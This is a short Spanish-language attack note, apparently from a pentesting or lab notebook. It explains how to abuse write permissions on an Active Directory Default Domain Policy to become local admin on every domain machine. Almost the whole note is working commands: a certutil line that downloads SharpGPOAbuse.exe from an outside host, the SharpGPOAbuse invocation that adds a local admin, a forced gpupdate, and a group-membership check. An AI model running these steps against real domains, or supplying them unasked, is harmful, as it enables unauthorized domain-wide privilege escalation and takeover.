---
title: Default Domain Policy — GPO Abuse
tags: [ad, gpo, privesc, sharphound]
---

# Default Domain Policy — GPO Abuse

> [!tip] Cuándo usarlo
> Si tu usuario tiene permisos de **WriteDacl / GenericWrite / GenericAll** sobre la Default Domain Policy, puedes añadirte como admin local en todos los equipos del dominio.

## Explotación

### 1. Bajar SharpGPOAbuse

```cmd
certutil -urlcache -f http://192.168.45.178:80/SharpGPOAbuse.exe SharpGPOAbuse.exe
```

### 2. Añadir usuario como admin local

```cmd
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

### 3. Forzar actualización de política

```cmd
gpupdate /force
```

### 4. Verificar

```cmd
# Reconectar por WinRM y comprobar
net localgroup Administrators
```

## Ver también
- [[BOFHound]]
- [[GenericAll DC]]
